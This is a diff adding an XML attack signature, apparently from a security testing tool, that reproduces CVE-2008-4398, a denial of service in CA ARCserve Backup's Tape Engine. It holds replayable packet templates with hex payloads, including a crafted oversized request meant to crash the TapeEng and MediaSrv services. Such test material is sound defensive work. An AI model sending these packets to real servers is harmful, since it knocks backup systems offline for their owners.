@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="CA ARCserve Backup Tape Engine Denial of Service"/>
+    <EngDesc display="true" value="There exists a denial of service vulnerability in CA BrightStor ARCserve Backup Tape Engine service. The vulnerability is due to insufficient input validation in the ClientCreateJobHandle library function. A remote unauthenticated attacker may exploit this vulnerability by sending a crafted message to the target server. Successful attack could cause a denial of service condition for the TapeEng and MediaSrv services."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="BOOK_SERVM"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="CA"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="CA_CA_ARCserve_Backup"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20081009-11"/>
+    <CVEID display="true" value="CVE-2008-4398"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="5f7178c0ccb811dd9b63000c29da7492"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633613944852968750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1229572903" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="M"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="O"/>
+    <NamedVar name="BOOK_SERVMdestPort" type="ImperfectControls.Port" value="null" index="P"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+    </for>
+    <for index="E"/>
+    <for index="G">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+    </for>
+    <for index="I"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="007C" Identification="5E7E" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7A4F" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$BOOK_SERVMdestPort" SeqNumber="00BFD9E3" AckNumber="89888FC4" HeaderLength="08" WindowSize="002E" Checksum="CF78" UrgentPointer="0000" Options="0101080A339E879F00000000" Payload="05000B03100000004800000000000000B810B810000000000100000000000100F03DB962028BCE11876C00805F84283701000000045D888AEB1CC9119FE808002B10486002000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="G" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0144" Identification="5E80" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7985" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$BOOK_SERVMdestPort" SeqNumber="00BFDA2B" AckNumber="89889000" HeaderLength="08" WindowSize="002E" Checksum="900D" UrgentPointer="0000" Options="0101080A339E87A3000B7515" Payload="05000003100000001001000000000000F8000000000000000000000041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424343434343434343434343434343434343434343434343434343434343434343000000004444444444444444444444444444444445454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545454545" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3">
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0070" Identification="73CF" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="250A" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="89888FC4" AckNumber="00BFDA2B" HeaderLength="08" WindowSize="FFB7" Checksum="C96C" UrgentPointer="0000" Options="0101080A000B7515339E879E" Payload="05000C03100000003C00000000000000B810B8106CA0500405003635303200000100000000000000045D888AEB1CC9119FE808002B10486002000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="I" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="73D0" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="2545" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="89889000" AckNumber="00BFDB3C" HeaderLength="08" WindowSize="FEA7" Checksum="1E0F" UrgentPointer="0000" Options="0101080A000B7515339E87A3" Payload="20" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
